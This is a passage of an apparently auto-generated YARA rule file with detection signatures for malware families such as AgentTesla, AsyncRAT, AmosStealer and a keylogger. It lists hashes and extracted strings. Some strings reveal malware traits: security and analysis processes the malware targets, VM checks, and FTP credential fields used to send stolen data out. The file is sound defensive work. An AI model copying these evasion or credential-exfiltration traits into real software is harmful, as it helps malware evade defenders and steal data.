      $s11 = "GetConstructors@" fullword ascii /* score: '9.00'*/
      $s12 = "get_Attributes@" fullword ascii /* score: '9.00'*/
      $s13 = "*CoreGetDeclaredFields@" fullword ascii /* score: '9.00'*/
      $s14 = "6CoreGetDeclaredConstructors@" fullword ascii /* score: '9.00'*/
      $s15 = " ! % ) - 1 5 9 = A E I M Q U Y ] a e i m q u y } " fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4f50 ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_108 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
   strings:
      $s1 = "NSystem.IAsyncResult.get_AsyncWaitHandle$get_CompletedEvent@" fullword ascii /* score: '18.00'*/
      $s2 = "VValidateUserDefinedConditionalLogicOperator" fullword ascii /* score: '17.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<System.String>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "GetFileLength`<EnsureThreadPoolBindingInitialized>g__Init|24_0P<GetFileLength>g__GetFileLengthCore|28_0" fullword ascii /* score: '15.00'*/
      $s5 = "LabelTarget&ExpressionCreator`1" fullword ascii /* score: '14.00'*/
      $s6 = "BComputeUsefulPertainantIfPossible&CreateMethodInvoker" fullword ascii /* score: '11.00'*/
      $s7 = "get_HasValue@" fullword ascii /* score: '9.00'*/
      $s8 = "\"GetValueOrDefault@" fullword ascii /* score: '9.00'*/
      $s9 = "GetInstance@" fullword ascii /* score: '9.00'*/
      $s10 = "$TypeMustNotBeByRef(TypeMustNotBePointer SetterMustBeVoid6PropertyTypeMustMatchGetter6PropertyTypeMustMatchSetter2BothAccessorsM" ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( all of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__25e3064d3ad9ad1f40911fe3d3c5_109 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash4 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash5 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash6 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash7 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash8 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash9 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash10 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = " ExecutionContext(IOCompletionCallback" fullword ascii /* score: '15.00'*/
      $s2 = "BindHandle for ThreadPool failed on this handle" fullword wide /* score: '13.00'*/
      $s3 = "RGetNativeOverlappedStateWindowsThreadPool" fullword ascii /* score: '12.00'*/
      $s4 = "An action was attempted during deserialization that could lead to a security vulnerability. The action has been aborted. To allo" wide /* score: '11.00'*/
      $s5 = "DEnsureThreadPoolBindingInitialized*InitThreadPoolBinding" fullword ascii /* score: '10.00'*/
      $s6 = "@GetNativeOverlappedForSyncHandle" fullword ascii /* score: '9.00'*/
      $s7 = "GetFileOptions@" fullword ascii /* score: '9.00'*/
      $s8 = "&GetOverlappedResult" fullword ascii /* score: '9.00'*/
      $s9 = "\"GetOverlappedData" fullword ascii /* score: '9.00'*/
      $s10 = ":get_DeserializationInProgress@ThrowIfDeserializationInProgress" fullword ascii /* score: '9.00'*/
      $s11 = "GetLocalValue" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9de24f4b875ab03a090f4ef94a1a134cd945d25380e089184c51ec945250cf13_9de24f4b_a69bc1b3ee708440bc5022a053b93f3622d22a677a472465d_110 {
   meta:
      description = "_subset_batch - from files 9de24f4b875ab03a090f4ef94a1a134cd945d25380e089184c51ec945250cf13_9de24f4b.msi, a69bc1b3ee708440bc5022a053b93f3622d22a677a472465d41b6240e5bccea3_a69bc1b3.msi, AteraAgent(signature).msi, AteraAgent(signature)_0345dafe.msi, AteraAgent(signature)_123ee7b9.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9de24f4b875ab03a090f4ef94a1a134cd945d25380e089184c51ec945250cf13"
      hash2 = "a69bc1b3ee708440bc5022a053b93f3622d22a677a472465d41b6240e5bccea3"
      hash3 = "698dbae0f0a37b59c0ba4197135a279511881fe3cffd675feedc5b357b572ec9"
      hash4 = "0345dafeea831a7e4f70756ee3d3bff609f65ac1986798a8c13cb420c4c89797"
      hash5 = "123ee7b9737081cd149be31fde2cb882b40f126a9c5d208898cc4bb072203759"
   strings:
      $s1 = "failed to execute view" fullword ascii /* score: '19.00'*/
      $s2 = "failed to get MsiLogging property" fullword ascii /* score: '17.00'*/
      $s3 = "Failed to get module filename" fullword ascii /* score: '12.00'*/
      $s4 = "Failed to get previous size of string" fullword ascii /* score: '12.00'*/
      $s5 = "Failed to get string from record" fullword ascii /* score: '12.00'*/
      $s6 = "Failed to set verbose logging global atom" fullword ascii /* score: '12.00'*/
      $s7 = "Failed to get data for property '%ls'" fullword ascii /* score: '12.00'*/
      $s8 = "Failed to get previous size of property data string." fullword ascii /* score: '12.00'*/
      $s9 = "LOGVERBOSE" fullword ascii /* score: '11.50'*/
      $s10 = "Entering %s in %ls, version %u.%u.%u.%u" fullword ascii /* score: '10.00'*/
      $s11 = "failed to fetch single record from view" fullword ascii /* score: '9.00'*/
      $s12 = "failed to initialize" fullword ascii /* score: '9.00'*/
      $s13 = "failed to open view on database" fullword ascii /* score: '9.00'*/
      $s14 = "Failed to create WcaVerboseLogging global atom." fullword ascii /* score: '8.00'*/
      $s15 = "Failed to create WcaNotVerboseLogging global atom." fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AmosStealer_signature__378f264f_AmosStealer_signature__99eabfe3_AmosStealer_signature__e52dd701_111 {
   meta:
      description = "_subset_batch - from files AmosStealer(signature)_378f264f.macho, AmosStealer(signature)_99eabfe3.macho, AmosStealer(signature)_e52dd701.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "378f264fdf11a14e6c5d49e1014f6f85cead7874a12a87b0eb662bf25c53d22b"
      hash2 = "99eabfe358a1df8966676dafbb1350a315e6df105ba5f21f707da2ec3ddbde59"
      hash3 = "e52dd70113d1c6eb9a09eafa0a7e7bcf1da816849f47ebcdc66ec9671eb9b350"
   strings:
      $s1 = "mh_execute_header" fullword ascii /* score: '19.00'*/
      $s2 = "__ZTISt11logic_error" fullword ascii /* score: '12.00'*/
      $s3 = "1logic_error" fullword ascii /* score: '12.00'*/
      $s4 = "__ZTSSt11logic_error" fullword ascii /* score: '12.00'*/
      $s5 = "__ZNSt11logic_errorC2EPKc" fullword ascii /* score: '12.00'*/
      $s6 = "__ZTSSt13runtime_error" fullword ascii /* score: '10.00'*/
      $s7 = "__ZNSt13runtime_errorD1Ev" fullword ascii /* score: '10.00'*/
      $s8 = "__ZNSt13runtime_errorC1EPKc" fullword ascii /* score: '10.00'*/
      $s9 = "__ZTISt13runtime_error" fullword ascii /* score: '10.00'*/
      $s10 = "3runtime_error" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0xfeca and filesize < 10000KB and ( all of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b5a517e6_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_112 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b5a517e6.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c1129d12.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b5a517e674d611f304c6f3ab0ab7c8e4b26a34df34bfcefdb0abb5cdabc6f37e"
      hash2 = "c1129d126820d0b83ec14389944fd8a7ade95e6a980245d37b904623183ddbf1"
   strings:
      $x1 = "ProcessHacker.exe" fullword wide /* score: '33.00'*/
      $s2 = "MpCmdRun.exe" fullword wide /* score: '28.00'*/
      $s3 = "ConfigSecurityPolicy.exe" fullword wide /* score: '25.00'*/
      $s4 = "MSConfig.exe" fullword wide /* score: '25.00'*/
      $s5 = "procexp.exe" fullword wide /* score: '22.00'*/
      $s6 = "MSASCui.exe" fullword wide /* score: '22.00'*/
      $s7 = "MsMpEng.exe" fullword wide /* score: '22.00'*/
      $s8 = "MpUXSrv.exe" fullword wide /* score: '22.00'*/
      $s9 = "NisSrv.exe" fullword wide /* score: '22.00'*/
      $s10 = "Regedit.exe" fullword wide /* score: '22.00'*/
      $s11 = "Anti_Process" fullword ascii /* score: '15.00'*/
      $s12 = "isVM_by_wim_temper" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__9017f999e8f28c6d793f6881aa75a9be_imphash__a3__Logger_signature__9017f999e8f28c6d793f6881aa75a9be_imph_113 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash).exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_0aad90fe.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_22149b0e.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_2f07b213.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_5a849e64.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_6918e767.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_6f859d55.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_7348b25d.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_9b556b23.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_a6fa6968.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_d0040c52.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_d8da191e.exe, a3--Logger(signature)_9017f999e8f28c6d793f6881aa75a9be(imphash)_fbaf62c0.exe, a3--Logger(signature)_eb747ef392be02f8aca143ca04851371(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b56bb0c49de472c525b9babe74c5ec42dcd5bf59124c33ecbaa2c4352876f1c6"
      hash2 = "0aad90fec98a34546de99b4c83424ef23b6a967e7096dd7efe544e92bb143392"
      hash3 = "22149b0e647e4309161e1908d1620f111a209436b288fdea265214cdebbb98c0"
      hash4 = "2f07b213c1011e1ab6b08456df810672bc30a82301a7529948262e47690e5b6a"
      hash5 = "5a849e64b65c6f62915336ae7abce6c1af560bd2caa343645e372b14816ebb8e"
      hash6 = "6918e767eaea5ec85ad611b425fe68d5d89f45114f5711f6c3366d307974795d"
      hash7 = "6f859d55d1ed8e9035fed061bb57fc1860a3c8c9cc42d6d621ca52bc89c3dae3"
      hash8 = "7348b25daab058f73ea6d07fabdc661ade7da5025e3d4910abe09948310f77fc"
      hash9 = "9b556b231ca7fa53f75d94a7d0d6c2cf3033b5936f48dfce9d02a4a9c039dccb"
      hash10 = "a6fa69683ac35b922b354a306128ac9b94cd5db5f5b800b6787f29e839f60306"
      hash11 = "d0040c52ffcdce6919af7fa1f93127df5d182b503ad53ba86c25136e4613adc8"
      hash12 = "d8da191e3fd27496caff93b24df4731ff7bc23dac4bb49a6687b2f612ac4ad60"
      hash13 = "fbaf62c070e275eeb07d0c4cc569e2c0c48141bca4487cb75f971038bf5fb264"
      hash14 = "ad79ba383703dd6a2316c5be3cea85af1e3413e86c5d33ba04ebca9412fdc346"
   strings:
      $s1 = "Select * from Win32_Process" fullword wide /* score: '19.00'*/
      $s2 = "fiddler" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00'*/
      $s3 = "procexp" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00'*/
      $s4 = "wireshark" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.00'*/
      $s5 = "@StrFtpPass" fullword wide /* score: '12.00'*/
      $s6 = "@StrFtpUser" fullword wide /* score: '12.00'*/
      $s7 = "Select * from Win32_LogicalDisk" fullword wide /* score: '9.00'*/
      $s8 = "@StrFtpServer" fullword wide /* score: '9.00'*/
      $s9 = "apatedns" fullword wide /* score: '8.00'*/
      $s10 = "vxstream" fullword wide /* score: '8.00'*/
      $s11 = "tcpview" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__636312a5ec1f8b9f790598a6e097c5a4_imphash__AgentTesla_signature__fdfd597602a97b999259741e5480e514_imph_114 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "80df1e272fd2703ce0da68500e5388fbc46aaf860db90a54ed4ea5a38fb962df"
      hash2 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "TargetDetails4ExceptionTypeNameFormatter\"TypeNameFormatter6RuntimeGenericParameterDesc" fullword ascii /* score: '17.00'*/
      $s2 = "(ExecutionEnvironment" fullword ascii /* score: '16.00'*/
      $s3 = "pSystem.Collections.Generic.ICollection<T>.get_IsReadOnly GrowForInsertion" fullword ascii /* score: '15.00'*/
      $s4 = ".CompletionActionInvoker.TaskContinuationOptions" fullword ascii /* score: '15.00'*/
      $s5 = "0get_UnderlyingSystemType" fullword ascii /* score: '12.00'*/
      $s6 = "$GetRuntimeTypeInfo" fullword ascii /* score: '12.00'*/
      $s7 = "z<GetRuntimeTypeInfo>g__GetConstructedGenericTypeForHandle|2_0t<GetRuntimeTypeInfo>g__GetFunctionPointerTypeForHandle|2_1" fullword ascii /* score: '12.00'*/
      $s8 = "RTryGetConstructedGenericTypeForComponentstTryGetConstructedGenericTypeForComponentsNoConstraintCheck" fullword ascii /* score: '12.00'*/
      $s9 = "><get_SyntheticConstructors>b__0><get_SyntheticConstructors>b__1><get_SyntheticConstructors>b__2" fullword ascii /* score: '9.00'*/
      $s10 = "HCoreGetDeclaredSyntheticConstructors4CoreGetDeclaredNestedTypes@" fullword ascii /* score: '9.00'*/
      $s11 = "2get_GenericParameterCountbGetGenericTypeParametersWithSpecifiedOwningMethod@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe_a6180d4d_a69bc1b3ee708440bc5022a053b93f3622d22a677a472465d_115 {
   meta:
      description = "_subset_batch - from files a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe_a6180d4d.exe, a69bc1b3ee708440bc5022a053b93f3622d22a677a472465d41b6240e5bccea3_a69bc1b3.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a6180d4df916ebaf457bbeefe49f26ef0ba8157ed62487dc27b5707a9fc8a9fe"
      hash2 = "a69bc1b3ee708440bc5022a053b93f3622d22a677a472465d41b6240e5bccea3"
   strings:
      $s1 = "Ehttp://www.ssl.com/repository/SSLcomRootCertificationAuthorityRSA.crt0 " fullword ascii /* score: '19.00'*/
      $s2 = "5http://cert.ssl.com/SSL.com-timeStamping-I-RSA-R1.cer0Q" fullword ascii /* score: '17.00'*/
      $s3 = "http://ocsps.ssl.com0?" fullword ascii /* score: '17.00'*/
      $s4 = "!SSL.com Timestamping Unit 2024 E10Y0" fullword ascii /* score: '17.00'*/
      $s5 = "5http://crls.ssl.com/SSL.com-timeStamping-I-RSA-R1.crl0" fullword ascii /* score: '13.00'*/
      $s6 = "&SSL.com Timestamping Issuing RSA CA R1" fullword ascii /* score: '13.00'*/
      $s7 = "?http://crls.ssl.com/SSLcom-SubCA-EV-CodeSigning-RSA-4096-R3.crl0" fullword ascii /* score: '13.00'*/
      $s8 = "&SSL.com Timestamping Issuing RSA CA R10" fullword ascii /* score: '13.00'*/
      $s9 = ".SSL.com EV Code Signing Intermediate CA RSA R30" fullword ascii /* score: '12.00'*/
      $s10 = ".SSL.com EV Code Signing Intermediate CA RSA R3" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0xcfd0 ) and filesize < 16000KB and pe.imphash() == "831cf1eb92db57d45b572547813631a4" and ( all of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_116 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash4 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $x1 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $x2 = "System.Diagnostics.Design.ProcessDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '32.00'*/
      $x3 = "System.Diagnostics.Design.ProcessModuleDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3" ascii /* score: '32.00'*/
      $s4 = "<EnumProcessModulesUntilSuccess" fullword ascii /* score: '15.00'*/
      $s5 = "Unable to enumerate the process modules" fullword wide /* score: '15.00'*/
      $s6 = "A 32 bit processes cannot access modules of a 64 bit process" fullword wide /* score: '11.00'*/
      $s7 = "&GetModuleFileNameEx" fullword ascii /* score: '9.00'*/
      $s8 = "(GetModuleInformation" fullword ascii /* score: '9.00'*/
      $s9 = "\"GetModuleBaseName" fullword ascii /* score: '9.00'*/
      $s10 = "GetFirstModule" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

